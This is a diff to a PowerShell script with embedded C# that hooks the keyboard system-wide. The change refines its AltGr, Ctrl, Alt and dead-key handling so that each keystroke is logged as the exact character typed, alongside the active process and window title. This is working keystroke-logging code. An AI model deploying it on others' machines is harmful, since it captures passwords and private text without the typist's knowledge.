@@ -61,15 +61,54 @@ public static class SpcHook {
             || (GetKeyState(0xA1) & 0x8000) != 0;
     }
     public static bool Caps() { return (GetKeyState(0x14) & 1) != 0; }
+    public static bool Ctrl() {
+        return (GetKeyState(0x11) & 0x8000) != 0 || (GetKeyState(0xA2) & 0x8000) != 0
+            || (GetKeyState(0xA3) & 0x8000) != 0;
+    }
+    public static bool Alt() {
+        return (GetKeyState(0x12) & 0x8000) != 0 || (GetKeyState(0xA4) & 0x8000) != 0
+            || (GetKeyState(0xA5) & 0x8000) != 0;
+    }
+    public static bool AltGr() { return Ctrl() && Alt(); }
+    // Layouts that distinguish the right Alt need VK_RMENU (0xA5), not only
+    // the generic VK_MENU, or AltGr+2 can come back as the base digit.
+    public static void CtrlState(byte[] state) {
+        state[0x11] = 0x80;
+        if ((GetKeyState(0xA2) & 0x8000) != 0) state[0xA2] = 0x80;
+        else if ((GetKeyState(0xA3) & 0x8000) != 0) state[0xA3] = 0x80;
+    }
+    public static void AltState(byte[] state) {
+        state[0x12] = 0x80;
+        if ((GetKeyState(0xA5) & 0x8000) != 0) state[0xA5] = 0x80;
+        else if ((GetKeyState(0xA4) & 0x8000) != 0) state[0xA4] = 0x80;
+    }
+    // ToUnicodeEx returns a negative count for a dead key and keeps it pending
+    // for the next call, so the callback can ignore that key without losing the
+    // composed character that follows.
+    public static bool LastDead;
     public static string Unicode(uint vk, uint scan) {
+        LastDead = false;
         byte[] state = new byte[256];
-        if (Shift()) state[0x10] = 0x80;
+        bool shift = Shift();
+        bool altGr = AltGr();
+        bool alt = Alt();
+        if (shift) state[0x10] = 0x80;
         if (Caps()) state[0x14] = 1;
+        // AltGr arrives as Ctrl+Alt: both flags make ToUnicodeEx return the
+        // layout symbol (@, €, ~). Ctrl alone stays unmarked so Ctrl+C logs
+        // "c" instead of ETX; Alt alone is marked for menu accelerators.
+        if (altGr) {
+            CtrlState(state);
+            AltState(state);
+        } else if (alt) {
+            AltState(state);
+        }
         uint pid;
         uint thread = GetWindowThreadProcessId(GetForegroundWindow(), out pid);
         IntPtr layout = GetKeyboardLayout(thread);
         StringBuilder text = new StringBuilder(8);
         int count = ToUnicodeEx(vk, scan, state, text, text.Capacity, 0, layout);
+        LastDead = count < 0;
         return count > 0 ? text.ToString(0, count) : "";
     }
 }
@@ -156,10 +195,12 @@ $callback = [SpcHook+Proc]{
             # UIA stays on the timer: a slow provider must not hold the hook
             # past LowLevelHooksTimeout and get it removed.
             Set-Context $context $false | Out-Null
+            $unicode = [SpcHook]::Unicode($info.vk, $info.scan)
             Write-Event @{
                 k = 'key'; ts = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
                 vk = [int]$info.vk; sh = [SpcHook]::Shift(); ca = [SpcHook]::Caps()
-                u = (B64 ([SpcHook]::Unicode($info.vk, $info.scan)))
+                ct = [SpcHook]::Ctrl(); al = [SpcHook]::Alt(); dk = [SpcHook]::LastDead
+                u = (B64 $unicode)
                 p = (B64 $context.proc); t = (B64 $context.title)
             }
         }
